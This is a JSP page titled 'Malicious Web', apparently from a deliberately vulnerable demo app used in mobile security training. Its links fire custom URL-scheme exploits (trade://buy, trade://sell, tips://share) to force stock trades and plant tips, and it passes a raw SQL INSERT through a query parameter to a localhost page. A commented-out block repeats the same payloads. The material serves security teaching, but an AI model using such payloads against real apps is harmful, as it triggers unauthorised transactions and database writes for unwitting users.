<%--
  Created by IntelliJ IDEA.
  User: denimgroup
  Date: 7/1/13
  Time: 12:57 PM
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="JSON.JSONObject" %>
<%@ page import="services.initDatabase" %>

<%
    response.setHeader("Cache-Control", "no-cache"); //HTTP 1.1
    response.setHeader("Pragma", "no-cache"); //HTTP 1.0
    response.setDateHeader("Expires", 0); //prevent caching at the proxy server
%>

<html>
<head>
    <title>Malicious Web</title>

    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="author" content="Jake Rocheleau">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="HandheldFriendly" content="true">
    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
    <link rel="stylesheet" type="text/css" href="../web/styles.css">
    <script type="text/javascript" src="http://code.jquery.com/jquery.min.js"></script>
    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script>
    <![endif]-->

</head>
<body>
<div id="view">
    <header>
        <h1>Malicious Web</h1>
    </header>

    <div id="container">
        <ul>
            <a href="trade://buy?symbol=GOOG&shares=10"><li class="clearfix">
                <h2>Buy Stock</h2>
                <p class="desc">Purchase stock through use of schema exploit  </p>
            </li></a>
            <a href="trade://sell?symbol=GOOG&shares=10'"><li class="clearfix">
                <h2>Sell Stock</h2>
                <p class="desc">Sell stock through use of schema exploit </p>
            </li></a>
            <a href="tips://share?symbol=GOOG&reason=all your tips belong to me"><li class="clearfix">
                <h2>Add Tips</h2>
                <p class="desc">Add malicious tip </p>
            </li></a>
            <a href="http://localhost:8080/web/tips.jsp?query=insert%20into%20version%28log%29%20values%28%27l337%20h4x0R%27%29"><li class="clearfix">
                <h2>Update App</h2>
                <p class="desc">Update to malicious version of Pandemobium </p>
            </li></a>
            <a href=""><li class="clearfix">
                <h2>SQL Injection</h2>
                <p class="desc">Inject Malicious SQL Query</p>
            </li></a>
            <a href=""><li class="clearfix">
                <h2>XSS</h2>
                <p class="desc">Cross Scripting - Server Side</p>
            </li></a>

            <a href=""><li class="clearfix">
                <h2>Location Service Exploit</h2>
                <p class="desc">Use GPS coordinates</p>
            </li></a>
            <a href=""><li class="clearfix">
                <h2>SSL Certificate</h2>
                <p class="desc">Allow non SSL pages</p>
            </li></a>
        </ul>
    </div>
</div>
<script type="text/javascript">
    $(document).ready(function(){
        $("a").on("click", function(e){

        });
    });
</script>
</body>

</html>

<%--
<div class="newUser">
    <h1 align="center"> Malicious Web</h1>
    <button type=submit name="buy" onclick="window.location='trade://buy?symbol=GOOG&shares=10';"> Buy Stock </button>
    <button type=submit name="sell" onclick="window.location='trade://sell?symbol=GOOG&shares=10';"> Sell Stock </button>
    <button type=submit name="tips" onclick="window.location='tips://share?symbol=GOOG&reason=all your tips belong to me';"> Send Tip </button>
     <button type=submit name="update" onclick="window.location='http://localhost:8080/web/tips.jsp?query=insert%20into%20version%28log%29%20values%28%27l337%20h4x0R%27%29;';">Update Version</button>
</div>

</body>
</html>--%>
